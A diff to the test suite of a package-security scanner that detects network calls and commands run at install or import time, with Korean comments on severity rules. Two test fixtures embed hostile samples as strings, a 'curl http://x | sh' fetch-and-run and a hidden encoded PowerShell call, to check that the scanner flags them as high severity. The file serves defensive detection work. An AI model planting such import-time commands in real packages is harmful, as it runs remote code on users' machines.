@@ -845,11 +845,17 @@ _NET = "import requests\n"
 _INIT = {"p-1/setup.py": ""}
 
 
-def _install_time_locations(files: dict[str, str]) -> set[str]:
+from engine.rules.install_time import RULE_INDIRECT_NET  # noqa: E402
+
+
+def _install_time_findings(files: dict[str, str]):
     roots = {k.split("/")[0] for k in files if k.endswith("/setup.py")}
     files = {**{f"{r}/PKG-INFO": "Name: p" for r in roots}, **files}
-    return {f.location for f in analyze_files(files)
-            if f.rule == RULE_INSTALL_TIME and f.severity is Severity.HIGH}
+    return [f for f in analyze_files(files) if f.rule in (RULE_INSTALL_TIME, RULE_INDIRECT_NET)]
+
+
+def _install_time_locations(files: dict[str, str]) -> set[str]:
+    return {f.location for f in _install_time_findings(files)}
 
 
 @pytest.mark.parametrize(
@@ -908,7 +914,35 @@ def _install_time_locations(files: dict[str, str]) -> set[str]:
     ],
 )
 def test_import_time_scope_follows_real_execution_paths(files, where):
-    assert where in _install_time_locations(files)
+    [f] = [f for f in _install_time_findings(files) if f.location == where]
+    # 확장 범위의 네트워크는 MEDIUM — 정상 패키지도 여기서 통신한다 (litellm·elementary-data
+    # ·memoryos 직전 정상 버전, lxml). 새 릴리스에 처음 나타나면 version_diff 가 올린다.
+    # setup.py 가 로컬 모듈 함수를 직접 부르는 경로(예전 범위)만 HIGH 다.
+    direct = files.get("p-1/setup.py", "").startswith("from mypkg")
+    assert f.severity is (Severity.HIGH if direct else Severity.MEDIUM)
+
+
+@pytest.mark.parametrize(
+    "files",
+    [
+        # 다른 모듈 경유여도 수상한 명령은 HIGH 그대로
+        {**_INIT, "p-1/pkg/__init__.py": "from .boot import go\ngo()\n",
+         "p-1/pkg/boot.py": "import subprocess\ndef go():\n"
+                            "    subprocess.Popen('curl http://x | sh', shell=True)\n"},
+        {**_INIT, "p-1/pkg/__init__.py": "import threading, os\n"
+         "def _r():\n    os.system('powershell -w hidden -enc AAAA')\n"
+         "threading.Thread(target=_r).start()\n"},
+    ],
+)
+def test_suspicious_command_in_extended_scope_stays_high(files):
+    assert RULE_INSTALL_TIME in _high_rules(files)
+
+
+def test_same_line_reached_directly_and_indirectly_is_reported_once_as_high():
+    files = {**_INIT, "p-1/pkg/__init__.py": _NET + "def go():\n    requests.get('http://x')\n"
+             "go()\n", "p-1/pkg/other.py": "from pkg import go\ngo()\n"}
+    found = [f for f in _install_time_findings(files) if f.location == "p-1/pkg/__init__.py:3"]
+    assert [(f.rule, f.severity) for f in found] == [(RULE_INSTALL_TIME, Severity.HIGH)]
 
 
 @pytest.mark.parametrize(
@@ -939,7 +973,7 @@ def test_cross_module_finding_is_reported_once():
     files = {**_INIT, "p-1/pkg/__init__.py": "",
              **{f"p-1/pkg/m{i}.py": "from pkg.log import get\nget()\n" for i in range(5)},
              "p-1/pkg/log.py": _NET + "def get():\n    requests.get('http://x')\n"}
-    hits = [f for f in analyze_files(files) if f.rule == RULE_INSTALL_TIME]
+    hits = [f for f in analyze_files(files) if f.rule == RULE_INDIRECT_NET]
     assert [f.location for f in hits] == ["p-1/pkg/log.py:3"]
 
 
@@ -1191,3 +1225,16 @@ def test_entrypoint_network_call_is_normal():
              "p-1/p/__init__.py": "",
              "p-1/p/cli.py": "import requests\ndef main():\n    requests.get('https://api')\n"}
     assert not {f.rule for f in analyze_files(files)} & {RULE_ENTRYPOINT, RULE_INSTALL_TIME}
+
+
+def test_new_indirect_network_call_is_escalated_but_existing_one_is_not():
+    """litellm 처럼 import 시 확장 범위에서 통신하던 패키지는 그대로, 새로 생기면 HIGH."""
+    boot = {"setup.py": "", "p/__init__.py": "from .cost import load\nM = load()\n",
+            "p/cost.py": "import httpx\ndef load():\n    return httpx.get('https://x').json()\n"}
+    plain = {"setup.py": "", "p/__init__.py": "M = {}\n"}
+    old_with = _findings("p-1.0", boot)
+    new_with = _findings("p-1.1", boot)
+    assert {f.rule for f in new_with} >= {RULE_INDIRECT_NET}
+    assert vd.new_behaviors(new_with, old_with) == []
+    [extra] = vd.new_behaviors(new_with, _findings("p-1.0", plain))
+    assert extra.severity is Severity.HIGH and extra.location == "p-1.1/p/cost.py:3"
